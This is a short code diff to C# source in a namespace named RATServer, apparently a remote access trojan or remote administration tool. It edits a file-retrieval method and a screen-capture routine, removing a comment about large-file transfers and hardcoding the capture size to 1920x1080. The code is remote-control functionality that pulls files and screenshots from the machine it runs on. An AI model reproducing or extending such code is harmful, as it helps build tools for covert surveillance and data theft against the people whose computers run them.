@@ -142,7 +142,6 @@ namespace RATServer
         }
         public static Response Retrieve(string Dir)
         {
-            //issues with large files likely due to predetermined connection buffer size
             Response r = new Response { Type = "Data" };
             try
             {
@@ -185,9 +184,8 @@ namespace RATServer
             Response r = new Response { Type = "Data" };
             try
             {
-                Screen ps = Screen.PrimaryScreen;
-                int width = ps.Bounds.Width;
-                int height = ps.Bounds.Height;
+                int width = 1920;
+                int height = 1080;
                 using (Bitmap bitmap = new Bitmap(width, height))
                 {
                     using (Graphics g = Graphics.FromImage(bitmap)) g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
